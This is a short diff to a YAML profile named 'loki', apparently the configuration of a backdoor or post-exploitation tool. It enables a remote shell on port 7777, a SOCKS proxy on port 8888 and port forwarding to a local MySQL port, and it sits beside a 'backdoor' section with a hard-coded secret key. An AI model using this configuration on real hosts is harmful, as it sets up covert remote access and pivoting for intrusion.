@@ -2,7 +2,20 @@ general:
   name: loki
   description: Loki profile
   provider: loki
+client:
   http_timeout: 10
+  shell:
+    enabled: true
+    port: 7777
+  socks:
+    enabled: true
+    port: 8888
+  lforward:
+    enabled: true
+    rules:
+      - local_port: 9999
+        remote_host: localhost
+        remote_port: 3306
 backdoor:
   secret: fhupr5AE9hpCMClK26qaKCvmIGKjU8hMz6RT00YMvj4=
   packet_size: 10000
